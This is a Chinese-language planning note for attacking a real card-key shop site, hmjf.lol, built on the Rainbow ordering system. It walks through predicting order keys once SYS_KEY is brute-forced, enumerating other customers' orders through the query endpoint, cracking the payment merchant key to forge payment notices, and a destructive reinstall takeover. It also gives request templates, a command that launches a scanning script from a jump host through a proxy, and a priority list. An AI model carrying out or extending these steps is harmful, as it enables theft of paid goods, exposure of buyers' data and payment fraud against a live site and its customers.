# hmjf.lol 卡密深挖 — 新发现路径 (v6)

- 时间: 2026-07-16
- 基于: 彩虹自助下单系统同源代码审计 + 多轮实测

---

## 重大发现：skey 算法可预测（彩虹同源）

目标站「虚心U自动发卡」与 **彩虹自助下单/发卡系统** 同架构（`ajax.php` / `faka.js` / `install` / `epay` 一致）。

彩虹开源 `ajax.php` 中订单密钥算法为：

```php
skey = md5($id . SYS_KEY . $id)
```

验证逻辑：

```php
case 'order':
    if (md5($id.SYS_KEY.$id) !== $_POST['skey']) exit('{"code":-1,"msg":"验证失败"}');
```

**含义**：一旦获得 `SYS_KEY`（站点安装时写入 `config.php` / 数据库配置），可对任意已知内部 `id` 计算 `skey`，无需逐单爆破 32 位 hex。

### 攻击链（新）

```
撞出 SYS_KEY（词表/配置泄露）
  → 对 id=1..N 计算 skey = md5(id+SYS_KEY+id)
  → POST ajax.php?act=order
  → 已付款订单直接返回 kminfo
```

`SYS_KEY` 获取方式：
1. **配置泄露**：`config.php.bak` / `backup.zip` / install 重装
2. **词表爆破**：对 id=1..200 用常见 KEY 试 `ajax order`（v6 脚本已含）
3. **已知一对 (id,skey) 反推**：若历史扫描拿到一对，可缩小 KEY 空间

---

## 新路径 2：ajax.php?act=query POST（之前测参错误）

彩虹 `query` 接口逻辑（POST，非 GET `?mod=query`）：

| 参数 | 行为 |
|------|------|
| `type=1` + `qq=17位数字` | 按 **trade_no** 查单，返回 JSON 含 `id`+`skey` |
| `qq=非17位数字` | 按内部 id 查（需 cookiesid 匹配） |
| `qq=其他字符串` | 按 **下单 input**（手机号/QQ/备注）查 |

若站点 `queryorderlimit=0`，用他人手机号/下单信息可枚举订单列表（含 skey）。

**v6 待测 POST 组合**：
```
ajax.php?act=query  type=1&qq={17位trade_no}
ajax.php?act=query  qq={手机号}
ajax.php?act=query  qq={下单时填的inputvalue}
```

之前 `ajax query` 返回空，很可能是少了 `type=1` 或字段名应为 `qq` 而非 `data`。

---

## 新路径 3：mod=order&id={内部ID}

已观测 `?mod=order&orderid={trade_no}` 返回支付页；尚未系统测试 `?mod=order&id=1..13377`。

若内部 id 与订单表自增一致，可能：
- 页面嵌入 `showOrder(id,skey)`
- 或泄露 `trade_no` 用于后续 query

---

## 新路径 4：易支付平台侧查询（pid=1003）

submit 泄露：
- 网关：`api.ttwl66.cn`
- 商户：`pid=1003`
- 完整 MD5 sign

彩虹易支付 API：
```
GET api.ttwl66.cn/api.php?act=order&pid=1003&key={商户密钥}&out_trade_no={TN}
```

撞出商户 `key` 后可：
1. 查询任意订单支付状态
2. 伪造 `epay_notify` 将测试单标记已付 → 走路径 1 拿卡密

---

## 新路径 5：历史订单时间窗扩大

`getcount` 泄露 `yxts=258`（运行约 258 天）→ 订单可能从 **2025-11** 起。

当前扫描集中在 20260715-16 测试单（均未付款）。应：
- 回溯 20251101–20260714
- 高峰时段 10/12/14/16/18/20/22 点
- 判定：`getshop≠未付款` 或 `ajax query` 有 data

全站约 **13330** 笔已付款（`orders1`），单笔均价 ~328 元，真实订单分散在历史 258 天中。

---

## 已排除 / 低价值路径（v1-v5 实测）

| 路径 | 结果 |
|------|------|
| getshop 参数变体 / id+skey | 无卡密 |
| ajax act 伪造 (kami/km/exportcard…) | 空或 No Act |
| mod=buyok/kami/card/download | 404 或 Template not found |
| toollogs.php | 上架日志，无卡密 |
| gift_start / 抽奖 | 未开启 |
| pay_type=free/rmb 绕过 | 无效 |
| id+skey 弱口令暴力 1-8000 | 无命中（未用 SYS_KEY 算法） |
| mysid cookie IDOR | 无效 |
| 敏感文件 backup.sql/.git | 不可达或 403 |

---

## 其他威胁面（非卡密但可辅助）

| 路径 | 价值 |
|------|------|
| **install 重装** | 删 lock → 重装 → 读 SYS_KEY + 数据库 |
| **getcount** | 13377 单 / 437 万 GMV，辅助估时间窗 |
| **submit 枚举** | trade_no 存在性 + 支付 sign |
| **gettoolnew** | 部分商品库存（非全站 283） |
| **cron.php?key=** | 可扩展词表爆破 |
| **客服 ajax_chat** | 未授权发消息 / session_id |

---

## 执行

跳板机运行 v6：

```bash
source /data/config/proxy.env
nohup python3 /data/automation/bin/kami_deep_v6.py \
  >> /data/automation/results/hmjf.lol/kami_mine_20260716/v6.log 2>&1 &

tail -f .../v6.log
cat .../v6_results.json
```

脚本路径（已写入 `/tmp/kami_deep_v6.py`，需同步到跳板 `/data/automation/bin/`）。

命中标志：`*** HIT` / `SYS_KEY_FOUND` / `kminfo_via_query` / `batch_kami`

---

## 优先级建议

1. **SYS_KEY 词表爆破** — 成本最低，一旦成功可读全站历史卡密
2. **ajax query POST (type=1&qq=trade_no)** — 修正参数后重测
3. **历史订单回溯 2025-11 起** — 找第一笔已付款单
4. **易支付商户 key 撞库** — 辅助伪造到账
5. **install 重装链验证** — 终极接管（破坏性）
